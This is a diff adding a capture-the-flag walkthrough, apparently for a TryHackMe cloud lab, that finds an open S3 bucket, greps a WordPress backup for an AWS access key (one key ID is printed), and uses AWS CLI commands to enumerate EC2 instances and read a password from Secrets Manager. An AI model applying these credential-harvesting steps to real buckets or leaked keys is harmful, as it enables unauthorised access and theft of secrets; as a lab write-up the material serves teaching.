@@ -408,25 +408,92 @@ Answer:
 
 ## Day 17: Elf Leaks
 
+HR sent out an image to announce the new site
 
+```
+https://s3.amazonaws.com/images.bestfestivalcompany.com/flyer.png
+```
 
+the URL contains the name of the S3 bucket, navigate to root of bucket, you can see
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/81a71c5f-2ebf-4d78-ad27-e7439f95b9da)
 
+we have read permission on it
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/252aef17-46df-405b-bd4e-47e9c880b145)
 
+on the last of xml bucket, you can see wp-backup.zip may interesting
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/257d84d7-0228-4ab2-9b29-fd2ad29d3772)
 
+download the file and unzip it, find the AKIA or you can find it in wp-config
 
+```
+cat * | grep AKIA
+```
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/6cf7ba11-6b00-4f1c-8463-0fc3b1efcab1)
 
+find the account ID belonging to the access key
 
+```
+aws sts get-access-key-info –access-key-id AKIAQI52OJVCPZXFYAOI --profile myprofile
+```
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/4c5fcc57-f904-4ea6-93a9-ba4af89ccb2e)
 
+find the username with our profile
 
+```
+aws sts get-caller-identity --profile myprofile
+```
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/35537098-e5d5-4dac-b08b-dac9a64fd43d)
 
+open the describe of EC2 instance
 
+```
+aws ec2 describe-instances --output text --profile myprofile
+```
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/f8c4fff0-7a92-4e1d-8ddb-d0e0f7db75e4)
 
+```
+aws secretsmanager help
+```
 
+in help page, we find the following list of commands
 
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/a4811a9c-eeb5-4eca-9c1d-776da73ead88)
+
+find out the database password stored in Secrets Manager
+
+```
+aws secretsmanager list-secrets --profile myprofile
+```
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/e6c77b1d-9f7c-41a5-adbd-8c0bc5e44f31)
+
+we got the secret id, which allow us to retrieve the secret
+
+```
+aws secretsmanager get-secret-value --secret-id HR-Pasword --profile myprofile
+```
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/227cd2d9-a61e-4f54-aa8e-5abec8452713)
+
+the secret can't be accessed from our current region, we have to specify a region closer to Santa
+
+i chose eu-north-1 as it is the closest to the north pole
+
+```
+aws secretsmanager get-secret-value --secret-id HR-Pasword --region eu-north-1 --profile myprofile
+```
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/72b65223-6af5-43e3-913a-81b1ff81e29c)
+
+Answer:
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/f063eb06-f7d3-4c9e-aebf-28abfb1d81f4)
+
+![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/6e3cb633-6d26-4f22-b0e7-624f936d278f)
